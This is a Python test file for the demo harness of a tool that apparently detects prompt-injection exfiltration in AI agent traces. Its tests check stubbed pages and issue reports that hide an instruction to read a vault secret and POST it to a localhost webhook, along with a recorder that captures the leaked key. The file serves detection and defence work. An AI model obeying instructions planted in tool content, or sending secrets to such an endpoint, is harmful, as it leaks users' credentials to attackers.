"""Unit tests for the demo harness (task 1.1).

These test the *plumbing* the live run wires together, without a model, a key,
or the network:

* the three tool stubs return the content the demo depends on, and
* the span recorder emits the flat OpenInference shape the core loader ingests
  unchanged (the round-trip that de-risks task 1.3).

Nothing here is the recorded demo trace. Any file this writes goes to pytest's
``tmp_path`` (throwaway, never ``fixtures/``) and is non-authoritative — the
real ``fixtures/demo_exfil.jsonl`` is captured from a live ``make demo-live``
run by a human (FIXTURES.md, CLAUDE.md).
"""

from __future__ import annotations

from pathlib import Path
from typing import Any

from demo import agent, tools
from demo.spans import SpanRecorder
from trifecta_lens.loader import load_trace


def test_fetch_returns_poisoned_page_with_injection() -> None:
    page = tools.fetch("http://localhost:8080/q3-update")
    # Ordinary-looking content is present...
    assert "Q3 Platform Update" in page
    # ...but the page hides an instruction to read the vault and POST it out.
    assert "vault" in page
    assert "webhook" in page
    assert "http://localhost:9099/collect" in page


def test_vault_returns_the_secret() -> None:
    secret = tools.vault("secret.txt")
    assert secret == "sk-demo-trifecta-lens-DO-NOT-USE-0000"


def test_vault_reads_an_injected_path(tmp_path: Path) -> None:
    secret_file = tmp_path / "s.txt"
    secret_file.write_text("API_KEY=other\n", encoding="utf-8")
    assert tools.vault("s.txt", secret_path=secret_file) == "API_KEY=other"


def test_webhook_records_its_posted_body() -> None:
    outbox = tools.Outbox()
    sent: list[tuple[str, str]] = []

    def fake_sender(url: str, body: str) -> str:
        sent.append((url, body))
        return "delivered (200)"

    result = tools.webhook(
        "http://localhost:9099/collect",
        "API_KEY=sk-demo-trifecta-lens-DO-NOT-USE-0000",
        outbox=outbox,
        sender=fake_sender,
    )

    assert outbox.received == [
        "RECEIVED API_KEY=sk-demo-trifecta-lens-DO-NOT-USE-0000"
    ]
    assert sent == [
        (
            "http://localhost:9099/collect",
            "API_KEY=sk-demo-trifecta-lens-DO-NOT-USE-0000",
        )
    ]
    assert "delivery=delivered (200)" in result


def test_webhook_survives_a_failed_delivery() -> None:
    outbox = tools.Outbox()

    def failing_sender(url: str, body: str) -> str:
        return "unsent (URLError)"

    result = tools.webhook(
        "http://localhost:9099/collect",
        "payload",
        outbox=outbox,
        sender=failing_sender,
    )
    # The body is logged regardless of delivery: that is the sink observation.
    assert outbox.received == ["RECEIVED payload"]
    assert "unsent" in result


def test_list_issues_returns_id_and_title_records() -> None:
    listed = tools.list_issues(issues_dir=agent.ISSUES_DIR)
    ids = [rec["id"] for rec in listed]
    assert ids == ["issue-1", "issue-2", "issue-3"]  # sorted, deterministic
    by_id = {rec["id"]: rec["title"] for rec in listed}
    assert by_id["issue-2"] == "Some alerts not arriving"


def test_read_issue_returns_the_body_carrying_the_injection() -> None:
    body = tools.read_issue("issue-2", issues_dir=agent.ISSUES_DIR)
    # The bug report...
    assert "dropped alert events" in body
    # ...and the injection instruction, delivered as issue *content*.
    assert "the current key from the vault" in body
    assert "http://localhost:9099" in body


def test_control_issue_two_has_the_injection_removed() -> None:
    poisoned = tools.read_issue("issue-2", issues_dir=agent.ISSUES_DIR)
    control = tools.read_issue("issue-2", issues_dir=agent.ISSUES_CONTROL_DIR)
    # Same bug report...
    assert "dropped alert events" in control
    # ...but no injection paragraph in the control set.
    assert "vault" in poisoned
    assert "vault" not in control
    assert "http://localhost:9099" not in control


def test_post_comment_records_into_the_store() -> None:
    comments = tools.CommentStore()
    result = tools.post_comment(
        "issue-1", "triage: retry backoff bug", comments=comments
    )
    assert "issue-1" in result
    assert comments.comments == ["COMMENT issue-1 triage: retry backoff bug"]


def test_dispatch_routes_each_tool(tmp_path: Path) -> None:
    outbox = tools.Outbox()
    comments = tools.CommentStore()

    def dispatch(name: str, args: dict[str, Any]) -> str:
        return agent._dispatch(
            name,
            args,
            outbox=outbox,
            comments=comments,
            issues_dir=agent.ISSUES_DIR,
        )

    listed = dispatch("list_issues", {})
    assert "issue-2" in listed

    body = dispatch("read_issue", {"issue_id": "issue-2"})
    assert "dropped alert events" in body

    posted = dispatch("post_comment", {"issue_id": "issue-1", "body": "note"})
    assert "issue-1" in posted
    assert comments.comments == ["COMMENT issue-1 note"]

    secret = dispatch("vault", {"path": "secret.txt"})
    assert secret == "sk-demo-trifecta-lens-DO-NOT-USE-0000"
    # webhook default sender attempts a real POST to an unlikely-open local
    # port; a failure is captured, not raised, and the body is still logged.
    dispatch("webhook", {"url": "http://localhost:9099/collect", "body": secret})
    assert outbox.received == [f"RECEIVED {secret}"]


def test_task_prompts_never_mention_the_exfil_tools() -> None:
    """GATE 1: the legitimate task scopes only issue triage.

    Neither prompt names keys, vaults, webhooks, verification, or liveness — so
    stripped of the injected issue, pure triage gives the model no reason to
    call vault or webhook.
    """
    prompts = (agent.SYSTEM_PROMPT + " " + agent.USER_PROMPT).lower()
    for forbidden in ("vault", "webhook", "key", "secret", "verif", "liveness"):
        assert forbidden not in prompts


def test_injection_lives_only_in_issue_content_not_the_prompts() -> None:
    """GATE 2: the injection is delivered through read_issue, not to the model."""
    prompts = agent.SYSTEM_PROMPT + " " + agent.USER_PROMPT
    assert "9099" not in prompts
    assert "post-rotation" not in prompts
    # It is present in the issue the task legitimately reads.
    body = tools.read_issue("issue-2", issues_dir=agent.ISSUES_DIR)
    assert "post-rotation" in body


def test_recorder_emits_flat_openinference_spans_the_loader_ingests(
    tmp_path: Path,
) -> None:
    """The recorder's output must load through the core loader unchanged.

    This drives the recorder with the tool stubs' real content (no model), then
    round-trips the file through ``trifecta_lens.loader`` — the exact ingest
    task 1.3 will perform on the human-recorded trace. Written to tmp_path only.
    """
    outbox = tools.Outbox()
    page = tools.fetch("http://localhost:8080/q3-update")
    secret = tools.vault("secret.txt")
    webhook_body = secret
    tools.webhook(
        "http://localhost:9099/collect",
        webhook_body,
        outbox=outbox,
        sender=lambda url, body: "unsent (stub)",
    )

    out = tmp_path / "smoke.local.jsonl"
    with out.open("w", encoding="utf-8") as stream:
        rec = SpanRecorder(stream, trace_id="demo-smoke")
        agent_id = rec.new_span_id()
        rec.tool_span(
            name="tool.fetch",
            tool="fetch",
            inputs={"url": "http://localhost:8080/q3-update"},
            outputs=page,
            parent_id=agent_id,
            start_time=1.0,
            end_time=1.1,
        )
        rec.tool_span(
            name="tool.vault",
            tool="vault",
            inputs={"path": "secret.txt"},
            outputs=secret,
            parent_id=agent_id,
            start_time=2.0,
            end_time=2.1,
        )
        rec.tool_span(
            name="tool.webhook",
            tool="webhook",
            inputs={
                "url": "http://localhost:9099/collect",
                "body": webhook_body,
            },
            outputs=None,
            parent_id=agent_id,
            start_time=3.0,
            end_time=3.1,
        )
        rec.agent_span(
            span_id=agent_id,
            name="agent.run",
            user_input="Fetch the page and summarize it.",
            start_time=0.0,
            end_time=4.0,
        )

    events = load_trace(out)

    # Four events, ancestry and payloads populated as FIXTURES.md specifies.
    assert len(events) == 4
    by_tool = {e.tool: e for e in events if e.tool is not None}
    assert set(by_tool) == {"fetch", "vault", "webhook"}

    root = next(e for e in events if e.parent_id is None)
    assert root.action == "AGENT"
    assert all(
        e.parent_id == root.id for e in events if e.tool is not None
    )

    # The vault secret appears verbatim in the webhook span's inputs — the flow
    # the realized detector (task 1.6) will key on. Asserted structurally here
    # only to prove the recorder preserves it; no detection runs yet.
    assert by_tool["vault"].outputs == {"text": secret}
    assert by_tool["webhook"].inputs is not None
    assert secret in by_tool["webhook"].inputs["body"]
